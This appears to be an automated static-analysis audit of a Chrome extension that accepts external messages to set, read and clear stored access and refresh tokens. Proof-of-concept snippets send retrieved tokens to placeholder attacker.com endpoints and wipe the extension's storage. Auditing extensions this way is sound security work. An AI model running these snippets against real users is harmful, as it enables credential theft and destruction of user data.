# CoCo Analysis: laeneahkhikogfmdbchkjkccccobcgpk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 unique flows

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/laeneahkhikogfmdbchkjkccccobcgpk/opgen_generated_files/bg.js
Line 993  { vpinAccessToken: request.vpinAccessToken }

**Code:**

```javascript
// Background script - Entry point (bg.js line 983)
chrome.runtime.onMessageExternal.addListener(function (
  request,  // ← attacker-controlled from external extension/website
  sender,
  sendResponse
) {
  if (request.todo === "setToken") {
    chrome.storage.sync.set(
      { vpinAccessToken: request.vpinAccessToken },  // ← attacker-controlled value
      function () {
        console.log("vpinAccessToken is set to " + request.vpinAccessToken);
        chrome.action.setIcon({
          path: "/images/pin_128.png",
        });
      }
    );
    chrome.storage.sync.set(
      { vpinRefreshToken: request.vpinRefreshToken },  // ← attacker-controlled value
      function () {
        console.log("vpinRefreshToken is set to " + request.vpinRefreshToken);
      }
    );
    sendResponse({ msg: "ok" });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a whitelisted website (https://*.vpin.club/* or http://192.168.50.251:8080/*)
chrome.runtime.sendMessage('laeneahkhikogfmdbchkjkccccobcgpk', {
  todo: "setToken",
  vpinAccessToken: "malicious_token_1",
  vpinRefreshToken: "malicious_token_2"
});

// Then retrieve the poisoned data
chrome.runtime.sendMessage('laeneahkhikogfmdbchkjkccccobcgpk', {
  todo: "getToken"
}, (response) => {
  // Attacker receives back the stored tokens
  console.log(response.vpinAccessToken);  // "malicious_token_1"
  console.log(response.vpinRefreshToken); // "malicious_token_2"
  // Send to attacker server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(response)
  });
});
```

**Impact:** Complete storage exploitation chain - attacker can poison storage with arbitrary tokens AND retrieve them back via the "getToken" handler. The stored tokens are then sent back to the attacker through sendResponse, allowing token theft and credential manipulation. This affects authentication tokens used by the extension.

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/laeneahkhikogfmdbchkjkccccobcgpk/opgen_generated_files/bg.js
Line 1013  vpinRefreshToken: res.vpinRefreshToken

**Code:**

```javascript
// Background script - External message handler (bg.js line 983)
chrome.runtime.onMessageExternal.addListener(function (
  request,  // ← attacker can trigger from whitelisted domain
  sender,
  sendResponse
) {
  if (request.todo === "getToken") {
    getAllStorageSyncData().then((res) => {  // ← reads storage
      if (res.vpinAccessToken) {
        sendResponse({  // ← sends sensitive data back to attacker
          vpinAccessToken: res.vpinAccessToken,
          vpinRefreshToken: res.vpinRefreshToken,
        });
      }
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted website (https://*.vpin.club/* or http://192.168.50.251:8080/*)
chrome.runtime.sendMessage('laeneahkhikogfmdbchkjkccccobcgpk', {
  todo: "getToken"
}, (response) => {
  // Attacker receives stored tokens
  fetch('https://attacker.com/exfiltrate', {
    method: 'POST',
    body: JSON.stringify({
      accessToken: response.vpinAccessToken,
      refreshToken: response.vpinRefreshToken
    })
  });
});
```

**Impact:** Information disclosure - attacker from a whitelisted domain can retrieve sensitive authentication tokens (vpinAccessToken and vpinRefreshToken) stored by the extension and exfiltrate them to an attacker-controlled server.

---

## Sink 3-5: chrome_storage_sync_clear_sink and chrome_storage_local_clear_sink

**CoCo Trace:**
Lines 1028-1029 in bg.js

**Code:**

```javascript
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  if (request.todo === "clearToken") {  // ← attacker-triggered
    getAllStorageSyncData().then((res) => {
      chrome.action.setIcon({ path: "/images/pin_grey.png" }, () => {
        chrome.storage.sync.clear();   // ← clears all sync storage
        chrome.storage.local.clear();  // ← clears all local storage
      });
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted website
chrome.runtime.sendMessage('laeneahkhikogfmdbchkjkccccobcgpk', {
  todo: "clearToken"
});
// This wipes all extension storage, causing denial of service
```

**Impact:** Denial of Service - attacker can wipe all extension storage (both sync and local), destroying user data and forcing re-authentication. This disrupts extension functionality.
